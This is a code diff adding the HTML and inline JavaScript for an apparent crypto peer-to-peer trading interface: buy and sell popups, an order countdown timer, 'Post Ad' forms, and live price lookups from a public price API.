+    const convertedDivConv = document.querySelector('.conv-box-conv');
+    //const convertedUsdDiv = document.querySelector('.accept-box-conv-usd');
+
+    inputField.addEventListener('input', function () {
+      const inputValueConv = parseFloat(inputFieldConv.value);
+
+      // Update displayDiv with raw value
+      displayDivConv.textContent = inputFieldConv.value;
+
+      // Update convertedDiv with calculated value
+      if (!isNaN(inputValueConv)) {
+        convertedDivConv.textContent = (inputValueConv * 6.19).toFixed(2);
+      } else {
+        convertedDivConv.textContent = '';
+      }
+      
+      /**if (!isNaN(inputValue)) {
+        convertedUsdDiv.textContent = (inputValue * 0.1).toFixed(2);
+      } else {
+        convertedUsdDiv.textContent = '';
+      }**/
+    });
+  </script>
+    
+    
+    
+   
+  
+  
+    
+       <div id="express-from-modal" class="modal">
+  <div class="modal-content"> 
+    <div class="p-close-button-b" onclick="document.querySelector('#express-from-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><!--<span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span>--></div>   
+    
+    <ul id="express-from-list" class="crypto-list">  
+  <!-- List items will be dynamically added here --> 
+  </ul>   
+         </div> 
+         </div>
+    
+    
+    
+     
+           <div id="express-to-modal" class="modal"> 
+  <div class="modal-content"> 
+    <div class="p-close-button-b" onclick="document.querySelector('#express-to-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><!--<span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span>--></div> 
+       
+    <ul id="express-to-list" class="crypto-list"> 
+  <!-- List items will be dynamically added here --> 
+</ul>
+         </div>
+         </div>
+  
+
+  <!-- Modal for P2P transaction page -->
+  <div id="p2p-modal" class="modal">
+    <div class="modal-content"> 
+      <span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span>
+    <img src="https://justtrytech.com/static/7c677bf4606ca6b93305a4a846bfb3ef/57907/hero_image.webp" alt="BTC" class="binance-icon-two">
+      
+      <div class="become-merchant-area">   
+        <div><img src="https://cdn-icons-png.flaticon.com/128/3602/3602342.png" alt="notifications" class="become-image"></div>
+      </div>  
+      
+        <nav>
+            <button id="buy-tab" class="tab active active-buy">Buy</button>
+            <button id="sell-tab" class="tab">Sell</button> 
+        </nav>
+      
+   <select id="fiat-currency-selector">
+  <option value="USD">USD</option>  
+  <!--<option value="EUR">EUR</option>
+  <option value="GBP">GBP</option>
+  <option value="NGN">NGN</option> 
+  <option value="INR">INR</option>--> 
+</select>
+
+
+
+
+
+        <div class="crypto-selector">
+            <button class="active active-buy">BTC</button>
+            <button>ETH</button>
+            <button>USDT</button>
+            <button>USDC</button>
+            <button>TON</button> 
+        </div>
+
+        <div id="buy-section">
+            <div class="offers-container"></div>
+        </div>
+ 
+        <div id="sell-section" class="hidden"> 
+            <div class="offers-container"></div>
+        </div>
+
+      <div class="p2p-adapt-board">
+        <div class="p2p-home"><img src="https://cdn-icons-png.flaticon.com/128/2118/2118701.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Home</div></div>
+        <div class="p2p-orders"><img src="https://cdn-icons-png.flaticon.com/128/60/60492.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Orders</div></div>
+        <div class="p2p-ads" id="p2p-ads"><img src="https://cdn-icons-png.flaticon.com/128/726/726186.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Ads</div></div>
+        <div class="p2p-profile"><img src="https://cdn-icons-png.flaticon.com/128/456/456212.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Profile</div></div>
+      </div>
+       
+      
+       
+      <!-- Modal for P2P transaction page -->
+  <div id="post-ad-modal" class="modal">
+    <div class="modal-content"> 
+      <div class="p-close-button" onclick="document.querySelector('#post-ad-modal').style.display='none';document.querySelector('#p2p-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div>
+      <div class="post-ad-head">My Ads</div>
+      
+      <div class="post-ad-a">
+      <div class="post-ad-all">All</div>
+      <div class="">Normal</div>
+      </div>
+      
+      <div class="post-ad-b">
+      <div class="post-ad-bee">Cryptos</div>
+      <div class="post-ad-bee">Types</div>
+      <div class="">Status</div>
+      </div> 
+        
+      <div class="post-ad-mid"> 
+      <div class="post-ad-mid-img"><svg aria-hidden="true" class="bn-svg bn-emptyState-icon" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg"><path opacity="0.5" d="M84 28H64V8l20 20z" fill="#AEB4BC"></path><path opacity="0.2" fill-rule="evenodd" clip-rule="evenodd" d="M24 8h40v20h20v60H24V8zm10 30h40v4H34v-4zm40 8H34v4h40v-4zm-40 8h40v4H34v-4z" fill="#AEB4BC"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M22.137 64.105c7.828 5.781 18.916 5.127 26.005-1.963 7.81-7.81 7.81-20.474 0-28.284-7.81-7.81-20.474-7.81-28.284 0-7.09 7.09-7.744 18.177-1.964 26.005l-14.3 14.3 4.243 4.243 14.3-14.3zM43.9 57.9c-5.467 5.468-14.331 5.468-19.799 0-5.467-5.467-5.467-14.331 0-19.799 5.468-5.467 14.332-5.467 19.8 0 5.467 5.468 5.467 14.332 0 19.8z" fill="#AEB4BC"></path></svg></div> 
+      <div class="post-ad-not">You do not have any Ads</div>
+      <div class="post-ad-button" id="become-merchant-btn">Post Ad</div>
+      </div>
+      
+      <div class="p2p-adapt-board">
+        <div class="p2p-home" onclick="document.querySelector('#post-ad-modal').style.display='none';document.querySelector('#p2p-modal').style.display='block';"><img src="https://cdn-icons-png.flaticon.com/128/2118/2118701.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Home</div></div>
+        <div class="p2p-orders"><img src="https://cdn-icons-png.flaticon.com/128/60/60492.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Orders</div></div>
+        <div class="p2p-ads" id="p2p-ads-active"><img src="https://cdn-icons-png.flaticon.com/128/726/726186.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Ads</div></div>
+        <div class="p2p-profile"><img src="https://cdn-icons-png.flaticon.com/128/456/456212.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Profile</div></div>
+      </div>
+      
+    </div> 
+      </div>
+      
+      
+      
+      
+      
+      
+        <div id="ad-good-modal" class="modal">
+    <div class="modal-content"> 
+       <div class="not-board"> 
+     <img src="https://cdn-icons-png.flaticon.com/128/16741/16741218.png" alt="BTC" class="not-icon">
+     <div class="not-text-bold">Insufficient balance</div>
+     <div class="not-text">Your current balance is below the required limit</div>
+    <div class="not-cancel" onclick="document.querySelector('#ad-good-modal').style.display='none';document.querySelector('#p2p-modal').style.display='block';">Cancel</div>  
+       
+       
+      </div>
+      
+      
+      
+      <!--<div class="p-close-button" onclick="document.querySelector('#ad-good-modal').style.display='none';document.querySelector('#p2p-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></div>
+      
+      <div class=""><img src="https://cdn-icons-png.flaticon.com/128/18388/18388028.png" alt="Back" class="backrnd-circle"><img src="https://cdn-icons-png.flaticon.com/128/190/190411.png" alt="Back" class="front-circle"></div>
+      <div class="ad-good-txt">Ad Successfully Posted</div>
+      
+      <div class="ad-good-min-txt">Your Ad has been published and users can now place order. Please pay attention to the prompt for new orders</div>
+      
+      <div class="ad-good-box">
+        <div class="ad-good-row-a">
+          <div class="ad-good-type"><span class="ad-type-color">Sell&nbsp</span>BTC&nbsp<span class="ad-with-color">with&nbsp</span>USD</div>
+        <div class="ad-good-online">Online</div>
+        <img src="https://cdn-icons-png.flaticon.com/128/18388/18388636.png" alt="Back" class="ad-good-share">
+        </div>
+        
+        <div class="ad-good-amt"><span class="ad-good-sign">$</span>111,932</div>
+        
+        <div class="ad-good-column">
+        <div class="ad-good-row"><div class="ad-good-left">Total Amount</div><div class="ad-good-right">1.08 BTC</div></div>
+        <div class="ad-good-row"><div class="ad-good-left">Limit</div><div class="ad-good-right">3,550 - 100,000 USDT</div></div>
+        <div class="ad-good-row"><div class="ad-good-left">Ad Number</div><div class="ad-good-right">155651567255762715572725</div></div>
+        </div>  
+          
+        <div class="ad-good-row-a"><div class="ad-trans-color"></div><div class="ad-good-transfer">Tether Pay</div></div> 
+      </div> 
+       
+      <div class="ad-good-done" onclick="document.querySelector('#ad-good-modal').style.display='none';document.querySelector('#p2p-modal').style.display='block';">Done</div>-->
+      
+    </div> 
+      </div>
+      
+      
+      
+      
+      
+      <div id="sell-popup" class="popup hidden">
+            <div class="popup-content">
+                <span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span>
+                <div class="buy-label-name">Sell&nbsp<span id="coin-name"></span></div>
+        
+                  <form id="sell-form">
+                   <div class="price-column-edit">
+                  <label for="sell-price">Price<span id="sell-price"></span></label>
+                  </div>
+                    
+                    
+                    <div class="buy-cover">
+                    <div class="by-fiat">By USD&nbsp&nbsp&nbsp&nbsp&nbspBy Crypto</div>
+                      <div class="fiat-picker"></div>
+                    <label for="sell-quantity"></label>                  
+                      <div class="buy-cover-input">
+                    <span class="currency-symbol">USD</span>
+                    <input type="number" id="sell-quantity" name="sell-quantity" required>  
+                       <div class="currency-all">All</div>
+                       <div class="payer-limit"></div>
+                    
+                    
+                    <div class="payer-row">
+                     
+                   <div class="payer-column">
+                    <div class="payer-column-baby">You Receive</div>
+                    <div class="payer-column-baby">Processing Fee</div>
+                  </div>
+                  
+                  <div class="payer-column-two">
+                    <div class="payer-column-baby">--<span id="buy-coin-name"></div>
+                    <div class="payer-column-baby">--USD</div>
+                  </div>
+                  </div>
+               </div>
+                  </div>
+                       
+                       
+               <div class="buy-cover">
+                 <div class="buy-cover-input">
+                      <div id="payment-method">+ Add Payment Method</div>
+                   
+                     <div class="payer-row">
+                       <div class="payer-column">
+                         <div class="payer-column-baby">Payment Time Limit</div>
+                         <div class="payer-column-baby">Advertiser Status</div>
+                       </div>
+                  
+                       <div class="payer-column-three">
+                         <div class="payer-column-baby">15 Min</div>
+                         <div class="payer-column-baby">Online</div>
+                       </div>
+                     </div>
+                </div>
+              </div>
+                    
+                    <div class="terms-profile">
+                    <div class="terms-line">Terms</div>
+                    <div>Profile</div>
+                    </div>  
+                    
+                    <div class="read-ads-txt">Please read the advertiser's terms before placing an order</div>
+                    
+                    <div class="read-ads-sub">Stay online to complete trade</div> 
+                    
+                    <div class="profile-box">
+                     <div class="profile-box-name"><div class="seller-id-image"><img src="https://cdn-icons-png.flaticon.com/128/456/456212.png" alt="Coin Logo" class="seller-profile-ire"/></div>&nbspNecosmarts&nbsp<img src="https://cdn-icons-png.flaticon.com/128/5253/5253968.png" alt="Coin Logo" class="profile-verify"/></div>
+                     <div class="profile-box-sub"><img src="https://cdn-icons-png.flaticon.com/128/5253/5253968.png" alt="Coin Logo" class="profile-verify"/>&nbsp Verified merchant&nbsp<div class="profile-box-sub-a"></div></div>
+                    </div>
+                      
+                      
+                     <button type="submit" id="confirm-sell">Confirm Sell</button>
+                      <!--<div class="not-available-place-b" id="not-available-place-b">Place Order</div>-->
+
+                </form> 
+      
+            </div>
+        </div>
+        
+        
+        
+
+        <div id="buy-popup" class="popup hidden">
+            <div class="popup-content">
+              
+                <span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span>   
+                <div class="buy-label-name">Buy<span id="coin-name"></span></div>
+                
+                <form id="buy-form">
+                  <div class="price-column-edit">
+                  <label for="buy-price">Price<span id="buy-price"></span></label>  
+                  </div>
+                    
+                  <div class="buy-cover">
+                    <div class="by-fiat">By USD&nbsp&nbsp&nbsp&nbsp&nbspBy Crypto</div> 
+                    <div class="fiat-picker"></div>
+                  <div class="buy-cover-input">
+                    <label for="buy-quantity"></label>
+                    <span class="currency-symbol">USD</span>
+                    <input type="number" id="buy-quantity" name="buy-quantity" placeholder="Enter Amount" required>
+                    <div class="currency-all">All</div>
+                     <div class="payer-limit"></div>
+
+                    
+                   <div class="payer-row">
+                     
+                   <div class="payer-column">
+                    <div class="payer-column-baby">You Receive</div>
+                    <div class="payer-column-baby">Processing Fee</div>
+                  </div>
+                  
+                  <div class="payer-column-two">
+                    <div class="payer-column-baby">--<span id="buy-coin-name"></div>
+                    <div class="payer-column-baby">--USD</div>
+                  </div>
+                  </div>
+               </div>
+                  </div>
+                  
+                  
+                  <div class="buy-cover">
+                    <div class="buy-cover-input">
+                    <div id="buy-payment-method"><div class="buy-pm-show"></div></div>
+                   <!-- <select id="buy-payment-method" name="buy-payment-method">
+                        <option value="Lloyd Banks">Lloyd Banks</option>
+                        <option value="Bank-Transfer">Bank Transfer</option>
+                        <option value="USDT">USDT</option> 
+                        <option value="Alipay">Alipay</option> 
+                    </select>-->
+                      
+            
+                      
+                  <div class="payer-row">
+                  <div class="payer-column">
+                    <div class="payer-column-baby">Payment Time Limit</div>
+                    <div class="payer-column-baby">Advertiser Status</div>
+                  </div>
+                  
+                  <div class="payer-column-three">
+                    <div class="payer-column-baby">15 Min</div>
+                    <div class="payer-column-baby">Online</div>
+                  </div>
+                  </div>
+                </div>
+                  </div>
+                    
+                    <div class="terms-profile">
+                    <div class="terms-line">Terms</div>
+                    <div>Profile</div>
+                    </div>  
+                    
+                    <div class="read-ads-txt">Please read the advertiser's terms before placing an order</div>
+                     
+                    <div class="read-ads-sub">no third party payment</div>
+                      
+                    <div class="profile-box">
+                     <div class="profile-box-name"> <div class="seller-id-image"><img src="https://cdn-icons-png.flaticon.com/128/456/456212.png" alt="Coin Logo" class="seller-profile-ire"/></div>&nbspMerchant Buyer&nbsp<img src="https://cdn-icons-png.flaticon.com/128/5253/5253968.png" alt="Coin Logo" class="profile-verify"/></div>
+                     <div class="profile-box-sub"><img src="https://cdn-icons-png.flaticon.com/128/5253/5253968.png" alt="Coin Logo" class="profile-verify"/>&nbspNew merchant&nbsp</div>
+                    </div>
+                    
+                    
+                    <button type="submit" id="confirm-buy">Place Order</button>
+                    <!--<div class="not-available-place" id="not-available-place">Place Order</div>-->
+                </form>
+            </div>
+        </div>
+          
+          
+          
+          
+          
+          
+ 
+        <div id="order-summary-popup" class="popup hidden">  
+            <div class="popup-content">
+              <span class="close-button-cancel" onclick="document.querySelector('#order-summary-popup').style.display='none';document.querySelector('#p2p-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span><div class="cancel-order">Cancel the Order</div></span>
+              <div class="o-cr-txt">Order Created</div>
+           <div>
+              <div>
+                <div class="order-terms-complete">Pay the seller within&nbsp<div id="countdown">15:00</div></div>
+                
+                
+                <script>
+                let countdown; // Declare the countdown variable outside so it can be cleared
+
+function startCountdown(duration, display) {
+    let timer = duration, minutes, seconds;
+    
+    countdown = setInterval(function () {
+        minutes = Math.floor(timer / 60);
+        seconds = timer % 60;
+        
+        // Ensure two digits format for seconds
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        
+        // Display the timer
+        display.textContent = `${minutes}:${seconds}`;
+        
+        // Stop the timer when it reaches 0
+        if (--timer < 0) {
+            clearInterval(countdown);
+            display.textContent = "Time's up!";
+        }
+    }, 1000);
+}
+
+function resetTimer() {
+    // Clear any existing countdown
+    clearInterval(countdown);
+    
+    const countdownDisplay = document.getElementById('countdown');
+    const fifteenMinutes = 15 * 60; // 15 minutes in seconds
+    
+    // Restart the countdown
+    startCountdown(fifteenMinutes, countdownDisplay);
+}
+
+// Wait for the page to load
+window.onload = function () {
+    const countdownDisplay = document.getElementById('countdown');
+    const fifteenMinutes = 15 * 60; // 15 minutes in seconds
+    
+    // Start the initial countdown
+    startCountdown(fifteenMinutes, countdownDisplay);
+
+    // Add event listeners to both buttons
+    document.getElementById('confirm-buy').addEventListener('click', resetTimer);
+    document.getElementById('confirm-sell').addEventListener('click', resetTimer);
+};
+
+                </script>
+              </div>
+              
+             <div id="order-switch-off">
+              <div class="trader-info-box">
+                <div class="trader-info-column">
+                  <div class="trader-info-row">
+                  <div class="seller-id-image">B</div><div class="trader-namer"></div>
+                  </div>
+                  <div class="escrowed">Escrowed Crypto</div>
+                </div>
+                
+                <div class="chat-button">Chat</div>
+              </div>
+            
+              
+                <div id="order-details"></div>
+               
+              <div class="payment-method-details"> 
+
+                <div class="payment-ref">
+                  <div class="payment-ref-txt">Advertiser's terms</div>
+                  <div class="payment-ref-num"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728680.png" class="ref-num-img" alt="Back"></div> 
+                </div>
+                
+                <div class="payment-ref">
+                  <div class="payment-method-txt">Payment Method</div>
+                    <div class="seller-info">
+                      <div class="seller-pay-color"></div>&nbspBank Transfer
+              </div>
+            </div>      
+          </div>
+             
+             
+             
+              <div id="order-switch-on" class="order-switch-on hidden">
+              <div class="trader-info-box">
+                <div class="trader-info-column">
+                  <div class="trader-info-row">
+                  <div class="seller-id-image">C</div><div class="trader-namer"></div>
+                  </div>
+                  <div class="escrowed">Swapped Crypto</div>
+                </div>
+                
+                <div class="chat-button">Chat</div>
+              </div>
+           
+              
+                <div id="order-details"></div>
+              
+              <div class="payment-method-details">
+                <div class="payment-method-txt">Payment Method</div>
+                 <div class="payment-ref">
+                  <div class="payment-ref-txt">Ref Message</div>
+                  <div class="payment-ref-num">57938472946493629363</div> 
+                </div>
+                
+                  <div class="payment-method-details"><div class="seller-info"><div class="seller-pay-color"></div><div id="order-method"></div></div>
+              </div>
+            </div>       
+         </div>
+             
+              
+                <button id="confirm-payment">Make Payment</button>
+            </div>
+        </div>
+
+    </div>
+  </div>
+          
+          
+          
+<div id="approve-tether-pay" class="modal-b"> 
+   <div class="approve-board"> 
+     <img src="https://cdn-icons-png.flaticon.com/128/16741/16741218.png" alt="BTC" class="not-icon">
+     <div class="not-text-bold">Insufficient balance</div>
+     <div class="not-text">Your current balance is insufficient for this transaction</div>
+    <div class="not-cancel" onclick="document.querySelector('#approve-tether-pay').style.display='none';document.querySelector('#order-summary-popup').style.display='block';">Cancel</div>
+     
+      
+    </div>
+  </div>
+  
+        
+        
+        
+<!--<div id="not-available" class="modal"> 
+  <div class="modal-conten">  
+   <div class="not-board"> 
+     <img src="https://cdn-icons-png.flaticon.com/128/16741/16741218.png" alt="BTC" class="not-icon">
+     <div class="not-text-bold">Ad not available</div>
+     <div class="not-text">This merchant is not available in your region.</div>
+    <div class="not-cancel" onclick="document.querySelector('#not-available').style.display='none';document.querySelector('#p2p-modal').style.display='block';">Cancel</div>  
+       
+       
+      </div>
+    </div>
+  </div>-->
+       
+        
+        
+        
+        
+<!-- Become Merchant Page content -->
+      <div id="become-merchant-modal" class="modal">
+        <div class="modal-content"> 
+          <span class="close-button-three"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back" class=""></span></span>
+        <div class="receive-title">Post Ad</div> 
+           
+          
+        <!--<div class="level-indicator">
+            <span>Levels <span class="beginner">Beginner</span></span>
+            <button class="view-button">View</button>
+        </div>-->
+        <div class="section-one">
+            <div class="i-want-to">I Want to</div>
+            <div class="buy-sell-toggle">
+                <button class="buy">Buy</button>
+                <button class="sell active">Sell</button>
+            </div>
+        </div>
+          
+          
+          
+        
+        <div class="section">
+          <div class="section-align">
+            <div class="section-align-down">
+            <div class="section-align-header">Asset</div>
+           <div class="swap-section">
+                    <div class="token-select">
+                        <button class="dropdown-btn" id="token-in-button">
+                            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" alt="BTC" class="token-icon"> <span>BTC</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+ 
+            
+            <div class="section-align-down">
+            <div class="section-align-header">With</div>
+            <div class="swap-section">
+                    <div class="token-select">
+                        <button class="dropdown-btn" id="token-in-button-fiat">
+                            <img src="https://cdn-icons-png.flaticon.com/128/10542/10542001.png" alt="BTC" class="token-icon-fiat"> <span>Tether Pay</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+       </div>
+          
+          <div class="txn-fee-ad">Transaction fee ~0.005% on all USD/USDT transactions apply</div>
+  
+         
+        <div class="area-one">
+          <div class="section">
+            <!--<h2>Pricing Settings</h2>-->
+            <label for="pricing-method" class="custom-label">Price Type</label>
+            <div class="custom-select">Fixed Price</div>
+             
+         <div class="custom-input-container">
+           <label for="custom-input" class="custom-label">Price (USD)</label>
+           <input type="number" id="custom-input" class="custom-input" placeholder="Enter Price here">
+        </div>
+
+        </div>
+        <div class="section last-traded-price">
+            <div class="last-traded-header">Last Traded Prices</div>
+          <div class="set-reference-row">
+          <div class="reference-price">BTC: <div id="price-BTC">Loading...</div></div>
+          <div class="reference-price">Pi: <div id="price-Pi">Loading...</div></div>
+          <div class="reference-price">ETH: <div id="price-ETH">Loading...</div></div>
+          </div>
+ 
+    <script>
+        async function fetchBitcoinPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+                const data = await response.json();
+                const priceBTC = data.bitcoin.usd;
+                document.getElementById('price-BTC').innerText = `$${priceBTC}`;
+            } catch (error) {
+                document.getElementById('price-BTC').innerText = 'Loading...';
+                console.error('Error fetching Bitcoin price:', error);
+            }
+        }
+
+        fetchBitcoinPrice();
+        setInterval(fetchBitcoinPrice, 120000); // Update price every minute
+      
+      
+    async function fetchPiPrice() {
+    try {
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=story-2&vs_currencies=usd');
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const data = await response.json();
+        const pricePi = data['story-2'].usd;
+        document.getElementById('price-Pi').innerText = `$${pricePi.toFixed(2)}`;
+    } catch (error) {
+        document.getElementById('price-Pi').innerText = 'Loading...';
+        console.error('Error fetching Pi price:', error);
+    }
+}
+
+// Initial fetch on page load
+fetchPiPrice();
+
+// Update price every 60 seconds
+setInterval(fetchPiPrice, 120000);
+ 
+      
+      
+      async function fetchEthereumPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=wrapped-steth&vs_currencies=usd');
+                const data = await response.json();
+                const priceETH = data['wrapped-steth'].usd;
+                document.getElementById('price-ETH').innerText = `$${priceETH}`;
+            } catch (error) {
+                document.getElementById('price-ETH').innerText = 'Loading...';
+                console.error('Error fetching Ethereum price:', error);
+            }
+        }
+
+        fetchEthereumPrice();
+        setInterval(fetchEthereumPrice, 120000); // Update price every minute
+    </script> 
+    </div>
+        <div class="disclaimer"></div>
+       </div>
+          
+          
+           <div class="custom-input-container" id="custom-total-amt">
+           <label for="custom-input" class="custom-label">Total Amount</label>
+           <input type="number" id="custom-input" class="custom-input" placeholder="$2,500 - $10,000,000">
+        </div>
+          
+          <div class="quantity-block"> 
+          <div class="quantity">
+            <div class="total-qty-label">Order Limit</div>
+            <input type="number" id="total-quantity" placeholder="2,500 USD">
+          </div>
+          
+           <div class="quantity">
+            <div class="total-qty-label">&nbsp</div>
+            <input type="number" id="total-quantity" placeholder="10,000,000 USD">
+          </div>
+          </div>
+          
+          
+           <!-- Add button for Sell section -->
+      <div class="add-button">
+        <div class="add-button-column">
+        <p>Payment Method</p>
+        <div class="add-button-text">Select up to 5 payment methods</div>
+        </div>
+        <div class="add-button-button">Add +</div>
+      </div>
+  
+          
+        <div class="section-two">
+            <label>Payment Duration</label> 
+              <div class="payment-time-toggle">
+                <button class="fifteen-min">15 Min</button>
+               <button class="thirty-min active">30 Min</button>
+              </div>
+              
+           
+          
+           <!--<div class="custom-input-container">
+           <label for="custom-input" class="custom-label">Username</label>
+           <input type="text" id="custom-input" class="custom-input" placeholder="Enter Username">
+        </div>-->
+        </div>
+          
+          <div class="ad-terms">
+            <div class="ad-terms-title">Terms (Optional)</div>
+            <textarea class="ad-input" placeholder="Please do not include any crypto-related keywords such as crypto, P2P, C2C, BTC, USDT, ETH etc." required></textarea>
+          </div>
+          
+        <div class="min-max-description">  
+            <div>Limit: 2,500.00 USDT - 10,000,000.00 USDT</div>
+            <button id="confirm-ad-button" class="confirm-button">Confirm</button>
+        </div>
+    </div>
+  </div>
+         
+  </div>
+   
+     
+ </div>
+    <script src="script.js"></script>
+  
+  
+</body>
+</html>
+  
+
+
+ 
+ 
+
+
+
+
+
